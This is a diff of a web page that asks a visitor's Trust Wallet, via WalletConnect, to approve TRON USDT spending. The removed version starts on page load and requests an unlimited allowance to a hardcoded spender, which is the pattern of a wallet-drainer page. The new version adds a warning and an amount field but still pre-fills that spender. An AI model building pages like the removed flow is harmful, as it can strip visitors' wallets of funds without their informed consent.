@@ -1,285 +1,193 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>TRON USDT Approve</title>
   <style>
-    *{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:'Segoe UI',sans-serif;background:#0a0a0a;color:#e0e0e0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
-    h1{color:#26A17B;font-size:1.5rem;margin-bottom:6px}
-    .sub{color:#555;font-size:.83rem;margin-bottom:26px;text-align:center;line-height:1.6}
-    .card{background:#111;border:1px solid #1e1e1e;border-radius:14px;padding:24px;width:100%;max-width:500px;}
-    .step{display:flex;gap:12px;align-items:flex-start;padding:12px;border-radius:8px;background:#0d0d0d;border-left:3px solid #222;margin-bottom:10px;transition:border-color .3s;}
-    .step.active{border-left-color:#f0a500}.step.done{border-left-color:#22c55e}.step.error{border-left-color:#ef4444}
-    .step-icon{font-size:1.1rem;min-width:22px}
-    .step-title{font-weight:600;font-size:.9rem}
-    .step-detail{font-size:.72rem;color:#555;margin-top:3px;word-break:break-all}
-    #qr-area{display:flex;flex-direction:column;align-items:center;margin-top:18px;gap:10px;}
-    #qr-area p{color:#aaa;font-size:.82rem}
-    #qr-canvas{background:#fff;padding:8px;border-radius:8px}
-    #wc-uri{font-size:.62rem;color:#333;word-break:break-all;text-align:center;max-width:460px;background:#1a1a1a;padding:8px;border-radius:6px;}
-    #deeplink-btn{display:none;background:#3375BB;color:#fff;border:none;border-radius:10px;padding:13px;font-size:1rem;cursor:pointer;width:100%;margin-top:14px;font-weight:600;}
-    .result{display:none;margin-top:16px;background:#0d1f0d;border:1px solid #22c55e33;border-radius:8px;padding:14px;font-size:.72rem;color:#86efac;word-break:break-all;white-space:pre-wrap;}
-    .errbox{display:none;margin-top:16px;background:#1f0d0d;border:1px solid #ef444433;border-radius:8px;padding:14px;font-size:.72rem;color:#fca5a5;word-break:break-all;}
-    #retry{display:none;margin-top:12px;background:#ef4444;color:#fff;border:none;border-radius:8px;padding:10px 22px;cursor:pointer;font-size:.88rem;}
-    #debug-box{margin-top:14px;background:#0a0a14;border:1px solid #2222aa44;border-radius:8px;padding:12px;font-size:.68rem;color:#6677ff;word-break:break-all;white-space:pre-wrap;display:none;max-height:200px;overflow-y:auto;}
-    #loading-overlay{position:fixed;inset:0;background:#0a0a0aee;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999;gap:14px;}
-    .spinner{width:40px;height:40px;border:3px solid #222;border-top-color:#26A17B;border-radius:50%;animation:spin .8s linear infinite;}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    #loading-overlay p{color:#555;font-size:.85rem}
-    .wallet-info{margin-top:12px;padding:12px;background:#0d1f0d;border:1px solid #22c55e33;border-radius:8px;font-size:.8rem;}
+    body{background:#0b0b0b;color:#e5e5e5;font-family:system-ui;display:flex;justify-content:center;align-items:center;min-height:100vh}
+    .card{width:420px;max-width:92vw;background:#111;border:1px solid #222;border-radius:14px;padding:20px}
+    h2{margin:0 0 10px 0}
+    .row{margin:10px 0}
+    input,button{width:100%;padding:12px;border-radius:10px;border:1px solid #333;background:#0d0d0d;color:#fff}
+    button{cursor:pointer;font-weight:600}
+    .primary{background:#2b7cff;border:none}
+    .warn{background:#2a1a00;border:1px solid #5a3b00;color:#ffcc80;padding:10px;border-radius:10px;font-size:12px}
+    .ok{color:#86efac}
+    .err{color:#fca5a5}
+    .muted{color:#aaa;font-size:12px}
+    .badge{display:inline-block;padding:4px 8px;border-radius:999px;background:#1a1a1a;border:1px solid #2a2a2a;margin-right:6px}
   </style>
 </head>
 <body>
+  <div class="card">
+    <h2>USDT (TRC20) Approval</h2>
 
-<div id="loading-overlay">
-  <div class="spinner"></div>
-  <p>Loading…</p>
-</div>
+    <div class="row muted">
+      <span class="badge">Network: TRON Mainnet</span>
+      <span class="badge">Token: USDT</span>
+    </div>
 
-<h1>🔐 USDT Approve · TRC20</h1>
-<p class="sub">Unlimited approval · TRON Mainnet<br>Spender: TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</p>
+    <div class="row">
+      <div class="warn">
+        You’re granting a spender permission to use your USDT. Prefer **exact amount**.  
+        “Max” (unlimited) is convenient but riskier.
+      </div>
+    </div>
 
-<div class="card">
-  <div class="step" id="s1"><span class="step-icon">🔗</span>
-    <div><div class="step-title">Connect Wallet</div><div class="step-detail" id="d1">Waiting…</div></div></div>
-  <div class="step" id="s2"><span class="step-icon">✅</span>
-    <div><div class="step-title">Get Wallet Address</div><div class="step-detail" id="d2">Waiting…</div></div></div>
-  <div class="step" id="s3"><span class="step-icon">🏗️</span>
-    <div><div class="step-title">Build TX</div><div class="step-detail" id="d3">Waiting…</div></div></div>
-  <div class="step" id="s4"><span class="step-icon">✍️</span>
-    <div><div class="step-title">Sign TX</div><div class="step-detail" id="d4">Waiting…</div></div></div>
-  <div class="step" id="s5"><span class="step-icon">📡</span>
-    <div><div class="step-title">Broadcast</div><div class="step-detail" id="d5">Waiting…</div></div></div>
+    <div class="row">
+      <label class="muted">Spender (your contract)</label>
+      <input id="spender" value="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV" />
+    </div>
 
-  <div id="qr-area">
-    <p>📷 Scan with Trust Wallet (TRON Mainnet)</p>
-    <canvas id="qr-canvas" width="220" height="220"></canvas>
-    <div id="wc-uri">Generating QR…</div>
+    <div class="row">
+      <label class="muted">Amount (USDT)</label>
+      <input id="amount" placeholder="e.g. 10.5" />
+    </div>
+
+    <div class="row">
+      <label><input type="checkbox" id="maxToggle" /> Use MAX (unlimited)</label>
+    </div>
+
+    <div class="row">
+      <button id="connect" class="primary">Connect Wallet</button>
+    </div>
+
+    <div class="row">
+      <button id="approve" disabled>Approve</button>
+    </div>
+
+    <div class="row">
+      <div id="status" class="muted">Not connected</div>
+    </div>
   </div>
-  <button id="deeplink-btn">📲 Open Trust Wallet</button>
 
-  <div class="wallet-info" id="wallet-info" style="display:none;">
-    <strong>✅ Using Wallet:</strong> <span id="wallet-addr"></span>
-  </div>
-
-  <div class="result" id="result"></div>
-  <div class="errbox" id="errbox"></div>
-  <div id="debug-box"></div>
-  <button id="retry" onclick="location.reload()">🔄 Retry</button>
-</div>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script type="module">
-const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f"; // ← YOUR WC PROJECT ID
+const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
-const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const SPENDER    = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
-const TRONGRID = "https://api.trongrid.io";
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // mainnet
 
-// ── Base58 → Hex ────────────────────────────────────────────────────────────
-const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-function tronToHex(addr) {
-  let n = 0n;
-  for (const c of addr) n = n * 58n + BigInt(B58.indexOf(c));
-  const full = n.toString(16).padStart(50, "0");
-  return "0x" + full.slice(0, 42);
+let client, session, wallet;
+
+function setStatus(msg, cls="muted"){
+  const el = document.getElementById("status");
+  el.className = cls;
+  el.textContent = msg;
 }
 
-// ── ABI: approve(address,uint256) ───────────────────────────────────────────
-function encodeApprove(spenderHex) {
-  const addr20 = spenderHex.slice(4).padStart(64, "0"); // drop 0x41
-  const max = "f".repeat(64);
-  return "0x" + addr20 + max;
-}
-
-// ── Build TX (Mainnet only) ─────────────────────────────────────────────────
-async function buildTx(ownerHex) {
-  const body = {
-    owner_address: ownerHex.slice(2),
-    contract_address: tronToHex(USDT_TRC20).slice(2),
-    function_selector: "approve(address,uint256)",
-    parameter: encodeApprove(tronToHex(SPENDER)).slice(2),
-    fee_limit: 40_000_000, // Reduced fee
-    call_value: 0,
-    visible: false
-  };
-
-  const res = await fetch(`${TRONGRID}/wallet/triggersmartcontract`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body)
+// Safe base58→hex via TronGrid (avoid custom math bugs)
+async function toHex(base58){
+  const res = await fetch("https://api.trongrid.io/wallet/validateaddress", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ address: base58 })
   });
-  
   const data = await res.json();
-  if (!data?.transaction) {
-    throw new Error("Build failed: " + JSON.stringify(data));
-  }
-  return data.transaction;
+  if(!data.result) throw new Error("Invalid address");
+  return data.hexAddress; // e.g. 41...
 }
 
-// ── Broadcast (Mainnet only) ────────────────────────────────────────────────
-async function broadcastTx(signedTx) {
-  const res = await fetch(`${TRONGRID}/wallet/broadcasttransaction`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(signedTx)
-  });
-  return await res.json();
-}
+// encode approve(address,uint256)
+async function encodeApprove(spenderB58, amountDec){
+  const spenderHex41 = await toHex(spenderB58);       // "41...."
+  const spender20 = spenderHex41.slice(2).padStart(64,"0");
 
-// ── Fix signature format ────────────────────────────────────────────────────
-function fixSignature(walletResp, unsignedTx) {
-  if (typeof walletResp?.signature === "string") {
-    return {
-      ...unsignedTx,
-      signature: [walletResp.signature.replace(/^0x/i, "")]
-    };
-  }
-  if (Array.isArray(walletResp?.signature)) {
-    return {
-      ...unsignedTx,
-      signature: walletResp.signature.map(s => s.replace(/^0x/i, ""))
-    };
-  }
-  return walletResp;
-}
-
-// ── UI ──────────────────────────────────────────────────────────────────────
-const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-function setStep(id, state, detail) {
-  document.getElementById(id).className = `step ${state}`;
-  document.getElementById(id.replace("s","d")).textContent = detail || "✓";
-}
-function showErr(msg) {
-  setStep("s5", "error", msg);
-  document.getElementById("errbox").style.display = "block";
-  document.getElementById("errbox").textContent = "❌ " + msg;
-  document.getElementById("retry").style.display = "inline-block";
-}
-function showResult(txid) {
-  setStep("s5", "done", "SUCCESS!");
-  const b = document.getElementById("result");
-  b.style.display = "block";
-  b.innerHTML = `✅ USDT APPROVED!\n\nTxID: ${txid}\n🔗 https://tronscan.org/#/transaction/${txid}`;
-}
-function debugLog(msg, obj) {
-  const box = document.getElementById("debug-box");
-  box.style.display = "block";
-  box.textContent += `\n${new Date().toLocaleTimeString()} ${msg}\n${JSON.stringify(obj, null, 2)}\n${"─".repeat(40)}\n`;
-  box.scrollTop = box.scrollHeight;
-  console.log(msg, obj);
-}
-let qrInst;
-function renderQR(uri) {
-  document.getElementById("wc-uri").textContent = uri;
-  if (isMobile) {
-    document.getElementById("deeplink-btn").style.display = "block";
-    document.getElementById("deeplink-btn").onclick = () => {
-      window.location.href = `trust://wc?uri=${encodeURIComponent(uri)}`;
-    };
+  let amountHex;
+  if (document.getElementById("maxToggle").checked){
+    amountHex = "f".repeat(64); // unlimited
   } else {
-    qrInst = new QRCode(document.getElementById("qr-canvas"), {
-      text: uri, width: 220, height: 220,
-      colorDark: "#000", colorLight: "#fff"
-    });
+    // USDT has 6 decimals
+    const v = BigInt(Math.floor(Number(amountDec || "0") * 1e6));
+    amountHex = v.toString(16).padStart(64,"0");
   }
-}
-function hideQR() {
-  document.getElementById("qr-area").style.display = "none";
-  document.getElementById("deeplink-btn").style.display = "none";
-}
-function showWallet(addr) {
-  document.getElementById("wallet-addr").textContent = addr;
-  document.getElementById("wallet-info").style.display = "block";
+
+  return "0x095ea7b3" + spender20 + amountHex;
 }
 
-// ── MAIN FLOW: Connect → Address → Build → Sign → Broadcast ─────────────────
-async function main() {
-  try {
-    document.getElementById("loading-overlay").style.display = "none";
-    
-    if (PROJECT_ID === "YOUR_PROJECT_ID_HERE") {
-      throw new Error("Set your WalletConnect Project ID");
+function openTrustWallet(uri){
+  const deep = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
+  window.location.href = deep;
+}
+
+async function init(){
+  const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
+  client = await SignClient.init({
+    projectId: PROJECT_ID,
+    metadata: {
+      name: "TRON Approve",
+      description: "USDT approval",
+      url: location.origin,
+      icons: ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
     }
+  });
+  setStatus("Ready");
+}
 
-    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
-
-    // 1. CONNECT WALLET
-    setStep("s1", "active", "Connect Trust Wallet…");
-    const client = await SignClient.init({
-      projectId: PROJECT_ID,
-      metadata: {
-        name: "USDT Approve",
-        description: "TRON USDT unlimited approval",
-        url: window.location.origin,
-        icons: ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
-      }
-    });
-    
+async function connect(){
+  try{
+    setStatus("Connecting...");
     const { uri, approval } = await client.connect({
       requiredNamespaces: {
-        tron: { methods: ["tron_signTransaction"], chains: [TRON_CHAIN], events: [] }
+        tron: { methods: ["tron_sendTransaction"], chains: [TRON_CHAIN], events: [] }
       }
     });
-    renderQR(uri);
-    const session = await approval();
-    hideQR();
-    setStep("s1", "done");
 
-    // 2. GET WALLET ADDRESS
-    const walletAddr = session.namespaces.tron.accounts[0].split(":")[2];
-    showWallet(walletAddr);
-    debugLog("✅ Wallet", walletAddr);
-    setStep("s2", "active", "Got address…");
-    setStep("s2", "done");
+    // Mobile: open wallet directly (no QR)
+    openTrustWallet(uri);
 
-    // 3. BUILD TX WITH WALLET ADDRESS
-    setStep("s3", "active", "Building TX…");
-    const unsignedTx = await buildTx(tronToHex(walletAddr));
-    debugLog("🏗️ Unsigned TX", unsignedTx);
-    setStep("s3", "done", `TXID: ${unsignedTx.txID.slice(0,16)}…`);
+    session = await approval();
+    wallet = session.namespaces.tron.accounts[0].split(":")[2];
 
-    // 4. SIGN WITH SAME WALLET
-    setStep("s4", "active", "Signing…");
-    const walletResponse = await client.request({
-      topic: session.topic,
-      chainId: TRON_CHAIN,
-      request: { method: "tron_signTransaction", params: { transaction: unsignedTx } }
-    });
-    const signedTx = fixSignature(walletResponse, unsignedTx);
-    debugLog("✍️ Signed TX", signedTx);
-    setStep("s4", "done");
+    setStatus("Connected: " + wallet, "ok");
+    document.getElementById("approve").disabled = false;
 
-    // 5. BROADCAST
-    setStep("s5", "active", "Broadcasting…");
-    const result = await broadcastTx(signedTx);
-    debugLog("📡 Broadcast", result);
-    
-    if (result.result === true) {
-      showResult(result.txid);
-    } else {
-      // Decode TRON error
-      let errorMsg = result.message || JSON.stringify(result);
-      if (result.message) {
-        try {
-          errorMsg = atob(result.message);
-        } catch(e) {}
-      }
-      throw new Error(errorMsg.includes("permission") ? 
-        "❌ Wallet needs TRX for fees + Energy permission" : 
-        errorMsg
-      );
-    }
-
-  } catch (err) {
-    console.error(err);
-    showErr(err.message);
+  }catch(e){
+    // Auto retry once if expired
+    setStatus("Retrying…");
+    setTimeout(connect, 1000);
   }
 }
 
-main();
+async function approve(){
+  try{
+    if(!wallet) throw new Error("Not connected");
+
+    const spender = document.getElementById("spender").value.trim();
+    const amount  = document.getElementById("amount").value.trim();
+
+    if (!document.getElementById("maxToggle").checked && !amount){
+      throw new Error("Enter amount or enable MAX");
+    }
+
+    setStatus("Preparing transaction…");
+
+    const data = await encodeApprove(spender, amount);
+
+    // Wallet builds + signs + broadcasts (no owner mismatch)
+    const res = await client.request({
+      topic: session.topic,
+      chainId: TRON_CHAIN,
+      request: {
+        method: "tron_sendTransaction",
+        params: {
+          to: USDT,
+          data: data,
+          value: "0x0"
+        }
+      }
+    });
+
+    setStatus("Success: " + JSON.stringify(res), "ok");
+
+  }catch(e){
+    setStatus("Error: " + e.message, "err");
+  }
+}
+
+document.getElementById("connect").onclick = connect;
+document.getElementById("approve").onclick = approve;
+
+init();
 </script>
 </body>
 </html>
